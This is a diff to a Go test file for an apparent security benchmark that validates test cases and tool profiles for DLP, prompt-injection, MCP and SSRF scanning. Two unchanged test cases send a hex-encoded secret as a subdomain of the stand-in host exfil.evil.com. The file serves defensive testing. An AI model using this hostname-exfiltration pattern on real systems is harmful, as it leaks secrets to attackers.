@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -148,7 +149,7 @@ func TestMissingPayloadFields(t *testing.T) {
 				"transport": "fetch_proxy",
 				"payload": {"url": "https://example.com"},
 				"expected_verdict": "block", "severity": "high",
-				"capability_tags": ["response_injection"], "requires": ["response_scanning"],
+				"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
 				"false_positive_risk": "low", "why_expected": "test",
 				"notes": "", "source": ""
 			}`,
@@ -464,7 +465,7 @@ func TestMITMOnlyAllowsHTTPProxy(t *testing.T) {
 		"transport": "fetch_proxy",
 		"payload": {"url": "https://example.com", "response_body": "test"},
 		"expected_verdict": "block", "severity": "high",
-		"capability_tags": ["response_injection"], "requires": ["response_scanning"],
+		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
 		"false_positive_risk": "low", "why_expected": "test",
 		"notes": "", "source": ""
 	}`)
@@ -841,7 +842,7 @@ func TestResponseMITMValidPayload(t *testing.T) {
 		"transport": "http_proxy",
 		"payload": {"url": "https://example.com", "response_body": "<html>injected</html>"},
 		"expected_verdict": "block", "severity": "high",
-		"capability_tags": ["response_injection"], "requires": ["response_scanning", "tls_interception"],
+		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning", "tls_interception"],
 		"false_positive_risk": "low", "why_expected": "test",
 		"notes": "", "source": ""
 	}`)
@@ -862,7 +863,7 @@ func TestRequestBodyValidPayload(t *testing.T) {
 		"transport": "http_proxy",
 		"payload": {"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "{\"key\": \"secret\"}"},
 		"expected_verdict": "block", "severity": "high",
-		"capability_tags": ["request_body_dlp"], "requires": ["request_body_scanning"],
+		"capability_tags": ["request_body_dlp"], "requires": ["request_body_dlp_scanning"],
 		"false_positive_risk": "low", "why_expected": "test",
 		"notes": "", "source": ""
 	}`)
@@ -883,7 +884,7 @@ func TestHeaderValidPayload(t *testing.T) {
 		"transport": "fetch_proxy",
 		"payload": {"method": "GET", "url": "https://example.com", "headers": {"Authorization": "Bearer secret123"}},
 		"expected_verdict": "block", "severity": "high",
-		"capability_tags": ["header_dlp"], "requires": ["header_scanning"],
+		"capability_tags": ["header_dlp"], "requires": ["header_dlp_scanning"],
 		"false_positive_risk": "low", "why_expected": "test",
 		"notes": "", "source": ""
 	}`)
@@ -960,18 +961,18 @@ func TestAllCategoryTransportCombinations(t *testing.T) {
 		transport string
 		payload   string
 	}{
-		"url+fetch_proxy":            {"url", "fetch_proxy", `{"method": "GET", "url": "https://example.com"}`},
-		"url+http_proxy":             {"url", "http_proxy", `{"method": "GET", "url": "https://example.com"}`},
-		"url+websocket":              {"url", "websocket", `{"method": "GET", "url": "https://example.com"}`},
-		"request_body+fetch_proxy":   {"request_body", "fetch_proxy", `{"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "data"}`},
-		"request_body+http_proxy":    {"request_body", "http_proxy", `{"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "data"}`},
-		"headers+fetch_proxy":        {"header", "fetch_proxy", `{"method": "GET", "url": "https://example.com", "headers": {"X-Key": "val"}}`},
-		"response_fetch+fetch_proxy": {"response_content", "fetch_proxy", `{"url": "https://example.com", "response_body": "hello"}`},
-		"response_mitm+http_proxy":   {"response_content", "http_proxy", `{"url": "https://example.com", "response_body": "hello"}`},
-		"mcp_input+mcp_stdio":        {"mcp_tool_call", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
-		"mcp_input+mcp_http":         {"mcp_tool_call", "mcp_http", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
-		"mcp_tool+mcp_stdio":         {"mcp_tool_result", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {}, "id": 1}]}`},
-		"mcp_chain+mcp_stdio":                {"mcp_tool_sequence", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
+		"url+fetch_proxy":                   {"url", "fetch_proxy", `{"method": "GET", "url": "https://example.com"}`},
+		"url+http_proxy":                    {"url", "http_proxy", `{"method": "GET", "url": "https://example.com"}`},
+		"url+websocket":                     {"url", "websocket", `{"method": "GET", "url": "https://example.com"}`},
+		"request_body+fetch_proxy":          {"request_body", "fetch_proxy", `{"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "data"}`},
+		"request_body+http_proxy":           {"request_body", "http_proxy", `{"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "data"}`},
+		"headers+fetch_proxy":               {"header", "fetch_proxy", `{"method": "GET", "url": "https://example.com", "headers": {"X-Key": "val"}}`},
+		"response_fetch+fetch_proxy":        {"response_content", "fetch_proxy", `{"url": "https://example.com", "response_body": "hello"}`},
+		"response_mitm+http_proxy":          {"response_content", "http_proxy", `{"url": "https://example.com", "response_body": "hello"}`},
+		"mcp_input+mcp_stdio":               {"mcp_tool_call", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
+		"mcp_input+mcp_http":                {"mcp_tool_call", "mcp_http", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
+		"mcp_tool+mcp_stdio":                {"mcp_tool_result", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {}, "id": 1}]}`},
+		"mcp_chain+mcp_stdio":               {"mcp_tool_sequence", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
 		"hostname_exfiltration+fetch_proxy": {"url", "fetch_proxy", `{"method": "GET", "url": "https://7365637265743132.exfil.evil.com/"}`},
 		"hostname_exfiltration+http_proxy":  {"url", "http_proxy", `{"method": "GET", "url": "https://7365637265743132.exfil.evil.com/"}`},
 	}
@@ -1059,7 +1060,7 @@ func TestResponseContentPayloadMissingResponseBody(t *testing.T) {
 		"transport": "fetch_proxy",
 		"payload": {"url": "https://example.com"},
 		"expected_verdict": "block", "severity": "high",
-		"capability_tags": ["response_injection"], "requires": ["response_scanning"],
+		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
 		"false_positive_risk": "low", "why_expected": "test",
 		"notes": "", "source": ""
 	}`)
@@ -1078,7 +1079,7 @@ func TestResponseContentPayloadMissingURL(t *testing.T) {
 		"transport": "fetch_proxy",
 		"payload": {"response_body": "test"},
 		"expected_verdict": "block", "severity": "high",
-		"capability_tags": ["response_injection"], "requires": ["response_scanning"],
+		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
 		"false_positive_risk": "low", "why_expected": "test",
 		"notes": "", "source": ""
 	}`)
@@ -1097,7 +1098,7 @@ func TestRequestBodyPayloadMissingContentType(t *testing.T) {
 		"transport": "fetch_proxy",
 		"payload": {"method": "POST", "url": "https://example.com", "body": "data"},
 		"expected_verdict": "block", "severity": "high",
-		"capability_tags": ["request_body_dlp"], "requires": ["request_body_scanning"],
+		"capability_tags": ["request_body_dlp"], "requires": ["request_body_dlp_scanning"],
 		"false_positive_risk": "low", "why_expected": "test",
 		"notes": "", "source": ""
 	}`)
@@ -1239,15 +1240,32 @@ func strPtr(s string) *string { return &s }
 func allSupportsKeys() map[string]interface{} {
 	return map[string]interface{}{
 		"fetch_proxy": false, "http_proxy": false, "mcp_stdio": false,
-		"mcp_http": false, "websocket": false, "tls_interception": false,
-		"request_body_scanning": false, "header_scanning": false,
-		"response_scanning": false, "mcp_tool_baseline": false,
-		"mcp_chain_memory":              false,
-		"mcp_cross_server_chain_memory": false,
-		"mcp_data_class_labels":         false,
-		"a2a":                           false, "websocket_frame_scanning": false,
-		"a2a_scanning": false, "shell_analysis": false,
-		"dns_rebinding_fixture": false,
+		"mcp_http": false, "websocket": false, "a2a": false,
+		"tls_interception": false,
+		"url_dlp_scanning": false, "request_body_dlp_scanning": false,
+		"header_dlp_scanning": false, "response_prompt_injection_scanning": false,
+		"mcp_input_dlp_scanning": false, "mcp_input_prompt_injection_scanning": false,
+		"mcp_tool_policy": false, "mcp_tool_result_prompt_injection_scanning": false,
+		"mcp_tool_poison_scanning": false, "mcp_tool_baseline": false,
+		"mcp_chain_memory":                    false,
+		"mcp_cross_server_chain_memory":       false,
+		"mcp_data_class_labels":               false,
+		"a2a_dlp_scanning":                    false,
+		"a2a_prompt_injection_scanning":       false,
+		"a2a_card_prompt_injection_scanning":  false,
+		"a2a_card_drift_scanning":             false,
+		"a2a_ssrf_scanning":                   false,
+		"websocket_dlp_scanning":              false,
+		"websocket_prompt_injection_scanning": false,
+		"ssrf_scanning":                       false,
+		"ssrf_bypass_scanning":                false,
+		"domain_blocklist":                    false,
+		"entropy_scanning":                    false,
+		"encoding_evasion_scanning":           false,
+		"shell_analysis":                      false,
+		"crypto_dlp_scanning":                 false,
+		"hostname_exfil_scanning":             false,
+		"dns_rebinding_fixture":               false,
 	}
 }
 
@@ -1423,8 +1441,18 @@ func TestProfileValidation_NonBooleanSupports(t *testing.T) {
 func TestProfileValidation_File(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "profile.json")
-	data := `{"schema_version":1,"tool":"test","tool_version":"1.0","runner_version":"v1","claims":["url_dlp"],"supports":{"fetch_proxy":true,"http_proxy":false,"mcp_stdio":false,"mcp_http":false,"websocket":false,"tls_interception":false,"request_body_scanning":false,"header_scanning":false,"response_scanning":false,"mcp_tool_baseline":false,"mcp_chain_memory":false,"mcp_cross_server_chain_memory":false,"mcp_data_class_labels":false,"a2a":false,"websocket_frame_scanning":false,"a2a_scanning":false,"shell_analysis":false,"dns_rebinding_fixture":false}}`
-	_ = os.WriteFile(path, []byte(data), 0o600)
+	data, err := json.Marshal(Profile{
+		SchemaVersion: 1,
+		Tool:          "test",
+		ToolVersion:   "1.0",
+		RunnerVersion: "v1",
+		Claims:        []string{"url_dlp"},
+		Supports:      allSupportsKeys(),
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	_ = os.WriteFile(path, data, 0o600)
 
 	errors := validateProfileFile(path)
 	if len(errors) != 0 {
@@ -1496,8 +1524,20 @@ func TestProfileValidation_MissingSupportsKeys(t *testing.T) {
 func TestProfileValidation_RejectsUnknownFields(t *testing.T) {
 	dir := t.TempDir()
 	path := filepath.Join(dir, "profile.json")
-	data := `{"schema_version":1,"tool":"test","tool_version":"1.0","runner_version":"v1","claims":["url_dlp"],"supports":{"fetch_proxy":true,"http_proxy":false,"mcp_stdio":false,"mcp_http":false,"websocket":false,"tls_interception":false,"request_body_scanning":false,"header_scanning":false,"response_scanning":false,"mcp_tool_baseline":false,"mcp_chain_memory":false,"a2a":false,"websocket_frame_scanning":false,"a2a_scanning":false,"shell_analysis":false,"dns_rebinding_fixture":false},"bogus":true}`
-	_ = os.WriteFile(path, []byte(data), 0o600)
+	raw := map[string]interface{}{
+		"schema_version": 1,
+		"tool":           "test",
+		"tool_version":   "1.0",
+		"runner_version": "v1",
+		"claims":         []string{"url_dlp"},
+		"supports":       allSupportsKeys(),
+		"bogus":          true,
+	}
+	data, err := json.Marshal(raw)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_ = os.WriteFile(path, data, 0o600)
 
 	errors := validateProfileFile(path)
 	assertContainsError(t, errors, "unknown field")
